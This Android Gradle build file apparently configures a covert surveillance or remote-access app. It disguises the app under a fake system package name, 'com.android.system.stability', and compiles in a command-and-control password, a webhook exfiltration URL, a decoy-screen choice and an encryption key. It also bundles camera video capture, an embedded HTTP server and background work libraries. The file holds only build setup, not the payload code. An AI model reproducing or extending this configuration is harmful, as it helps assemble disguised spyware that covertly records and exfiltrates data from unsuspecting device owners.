plugins {
    id 'com.android.application'
}

def keystorePropertiesFile = rootProject.file('keystore.properties')
def keystoreProperties = new Properties()
if (keystorePropertiesFile.exists()) {
    keystoreProperties.load(new FileInputStream(keystorePropertiesFile))
}

android {
    namespace 'com.labs.labrats'
    compileSdk 37

    buildFeatures {
        buildConfig true
    }

    defaultConfig {
        applicationId "com.android.system.stability"
        minSdk 26
        targetSdk 37
        versionCode 623
        versionName "1.7.0"
        multiDexEnabled false

        def localProperties = new Properties()
        def localPropertiesFile = rootProject.file('local.properties')
        if (localPropertiesFile.exists()) {
            localProperties.load(new FileInputStream(localPropertiesFile))
        }

        def webhookUrl = (localProperties['WEBHOOK_URL'] ?: "").trim().replace("\"", "").replace("'", "")
        def c2Password = (localProperties['C2_PASSWORD'] ?: "admin1337").toString().trim().replace("\"", "").replace("'", "")
        def decoyChoice = (localProperties['DECOY_CHOICE'] ?: "1").toString().trim()
        def encryptionKey = (localProperties['ENCRYPTION_KEY'] ?: "AndroidKernel1337").trim().replace("\"", "").replace("'", "")

        if (webhookUrl.isEmpty()) {
            println "[BUILD WARNING] WEBHOOK_URL is EMPTY in local.properties!"
        } else {
            println "[BUILD SUCCESS] Webhook target configured: ${webhookUrl}"
        }

        buildConfigField "String", "WEBHOOK_URL", "\"${webhookUrl}\""
        buildConfigField "String", "C2_PASSWORD", "\"${c2Password}\""
        buildConfigField "int", "DECOY_CHOICE", "${decoyChoice}"
        buildConfigField "String", "ENCRYPTION_KEY", "\"${encryptionKey}\""
    }

    signingConfigs {
        release {
            if (keystorePropertiesFile.exists()) {
                storeFile rootProject.file(keystoreProperties['storeFile'] ?: 'lab-rats-keystore.jks')
                storePassword keystoreProperties['storePassword'] ?: 'lab-rats123'
                keyAlias keystoreProperties['keyAlias'] ?: 'lab-rats-key'
                keyPassword keystoreProperties['keyPassword'] ?: 'lab-rats123'
            }
        }
    }

    buildTypes {
        debug {
            debuggable false
            minifyEnabled false
            if (keystorePropertiesFile.exists() && signingConfigs.release.storeFile != null) {
                signingConfig signingConfigs.release
            }
        }
        release {
            minifyEnabled true
            shrinkResources true
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
            if (keystorePropertiesFile.exists() && signingConfigs.release.storeFile != null) {
                signingConfig signingConfigs.release
            }
        }
    }

    compileOptions {
        sourceCompatibility JavaVersion.VERSION_17
        targetCompatibility JavaVersion.VERSION_17
    }

    lint {
        checkReleaseBuilds false
        checkDependencies false
        abortOnError false
        checkAllWarnings false
        warningsAsErrors false
    }

    testOptions {
        unitTests {
            includeAndroidResources = true
            returnDefaultValues = true
        }
    }

    sourceSets {
        test {
            java.srcDirs = ['src/test/java']
        }
    }
}

dependencies {
    implementation 'androidx.appcompat:appcompat:1.7.0'
    implementation 'com.google.android.material:material:1.12.0'
    implementation 'androidx.constraintlayout:constraintlayout:2.2.0'
    implementation 'org.nanohttpd:nanohttpd:2.3.1'
    implementation 'androidx.work:work-runtime:2.10.0'
    implementation 'androidx.core:core:1.13.1'

    def camerax_version = "1.5.0"
    implementation "androidx.camera:camera-core:${camerax_version}"
    implementation "androidx.camera:camera-camera2:${camerax_version}"
    implementation "androidx.camera:camera-lifecycle:${camerax_version}"
    implementation "androidx.camera:camera-video:${camerax_version}"
    implementation "androidx.camera:camera-view:${camerax_version}"
    implementation "androidx.camera:camera-extensions:${camerax_version}"

    implementation 'com.squareup.okhttp3:okhttp:4.12.0'

    testImplementation 'junit:junit:4.13.2'
    testImplementation 'org.mockito:mockito-core:5.11.0'
    testImplementation 'org.robolectric:robolectric:4.11.1'
    testImplementation 'androidx.test:core:1.5.0'
}

tasks.register("fixXmlDeclarations") {
    doLast {
        fileTree("src/main/res").matching { include "**/*.xml" }.forEach { file ->
            def content = file.getText("UTF-8")
            if (content.contains("<?xml")) {
                def lines = content.readLines()
                int xmlIndex = lines.findIndexOf { it.trim().startsWith("<?xml") }
                if (xmlIndex > 0) {
                    def xmlLine = lines.get(xmlIndex)
                    def remaining = new ArrayList(lines)
                    remaining.remove(xmlIndex)
                    file.setText(xmlLine + "\n" + remaining.join("\n"), "UTF-8")
                }
            }
        }
    }
}

project.afterEvaluate {
    if (tasks.findByName("preBuild")) {
        tasks.named("preBuild").configure { dependsOn("fixXmlDeclarations") }
    }
}